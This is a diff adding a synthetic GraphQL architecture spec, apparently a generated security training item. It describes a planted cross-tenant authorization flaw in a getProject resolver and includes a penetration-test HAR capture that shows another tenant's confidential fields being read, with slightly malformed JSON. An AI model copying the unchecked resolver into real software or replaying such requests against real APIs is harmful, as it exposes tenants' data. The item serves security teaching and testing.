@@ -1,0 +1,131 @@
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** TaskFlow Collaboration API
+**Document Version:** 5.6.2 (FINAL)
+**Classification:** SENSITIVE
+**Domain:** SaaS / Project Management
+**Architecture:** GraphQL + event-sourcing + multi-tenant
+**Training Example ID:** GQL-0160
+
+## 1.0 Executive Summary
+TaskFlow Collaboration API is a saas / project management platform that exposes a GraphQL API to authorised consumers.
+The platform manages project datas partitioned by tenant (`tenantId`). The architecture uses
+JWT-based OAuth2 authentication, and the JWT carries both the `sub` (user ID) and `tenantId` claims.
+Authorization is expected to be enforced per-resolver on the GraphQL server.
+
+## 2.0 Architecture Overview
+- **API Layer:** GraphQL single endpoint (`POST /graphql`) served via Apollo Server
+- **Auth:** OAuth2 JWT issued by internal IdP; claims include `sub`, `role`, `tenantId`
+- **Database:** PostgreSQL with row-level security policies; each table has a `tenant_id` column
+- **Caching:** Redis cache keyed by `projectId` (NOTE: no user dimension in cache key)
+
+## 3.0 GraphQL Schema
+```graphql
+
+type Project {
+  projectId: ID!
+  tenantId: ID!
+  ownerId: ID!
+  status: String!
+  data: ProjectData
+  tasks: [Task!]
+}
+
+type ProjectData {
+  title: String
+  sensitiveField: String      # PII / business-sensitive
+  internalNotes: String       # Internal-only field
+  auditLog: [AuditEntry!]
+}
+
+type Query {
+  getProject(id: ID!): Project
+  listProjects(tenantId: ID, status: String): [Project!]
+  getProjectWithChildren(id: ID!): Project
+}
+
+type Mutation {
+  updateProject(id: ID!, input: ProjectInput!): Project
+  deleteProject(id: ID!): Boolean
+  bulkProjectLookup(ids: [ID!]!): [Project!]
+}
+
+```
+
+## 4.0 Known Architectural Notes
+- **RISK-GQL-160:** The `getProject` resolver fetches by `projectId` only.
+  The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`.
+  Tracked internally as a known gap pending remediation.
+- The `bulkProjectLookup` mutation accepts an arbitrary array of IDs without
+  per-ID ownership filtering.
+
+## 5.0 Vulnerability Context
+**Pattern:** 1.7 — Nested resources without parent authorization (BOLA)
+
+The `projectId` field is used as the object identifier across all resolvers.
+The resolver handling `projectId` does not enforce ownership or tenancy boundaries, enabling Pattern 1.7 exploitation.
+
+## 6.0 HAR Capture (Network Trace)
+The following HTTP Archive (HAR) capture was recorded during a penetration test.
+The attacker's token belongs to `tenant-0621` but the requested object belongs to `tenant-5665`.
+
+```json
+{
+  "log": {
+    "version": "1.2",
+    "creator": {"name": "SecurityProxy", "version": "1.0"},
+    "entries": [
+      {
+        "startedDateTime": "2026-04-13T16:22:35.858688+00:00",
+        "time": 146,
+        "request": {
+          "method": "POST",
+          "url": "https://api.taskflow-collaborati.example.com/graphql",
+          "httpVersion": "HTTP/2.0",
+          "headers": [
+            {"name": ":authority", "value": "api.taskflow-collaborati.example.com"},
+            {"name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"},
+            {"name": "content-type", "value": "application/json"},
+            {"name": "x-tenant-id", "value": "tenant-0621"}
+          ],
+          "queryString": [],
+          "postData": {
+            "mimeType": "application/json",
+            "text": "{\"query\": \"query VulnerableOp { getProject(id: "P-2160") { projectId tenantId ownerId data { sensitiveField internalNotes } } }\"}"
+          },
+          "bodySize": 194
+        },
+        "response": {
+          "status": 200,
+          "statusText": "OK",
+          "headers": [
+            {"name": "content-type", "value": "application/json"},
+            {"name": "x-request-id", "value": "req-06215665"}
+          ],
+          "content": {
+            "size": 205,
+            "mimeType": "application/json",
+            "text": "{\"data\": {\"getProject\": {\"tenantId\": \"tenant-5665\", \"ownerId\": \"other-user-06215665\", \"data\": {\"sensitiveField\": \"CONFIDENTIAL-06215665\", \"internalNotes\": \"Internal data exposed\"}}}}"}"
+          },
+          "bodySize": 361,
+          "redirectURL": "",
+          "headersSize": 120
+        },
+        "timings": {"send": 2, "wait": 103, "receive": 5},
+        "cache": {}
+      }
+    ]
+  }
+}
+```
+
+## 7.0 API Contract (Partial)
+```
+POST /graphql
+Authorization: Bearer <JWT>
+Content-Type: application/json
+
+Body: { "query": "..." }
+
+Authenticated user's tenantId is extracted from JWT.
+Resolver MUST cross-check tenantId against fetched object's tenantId.
+```
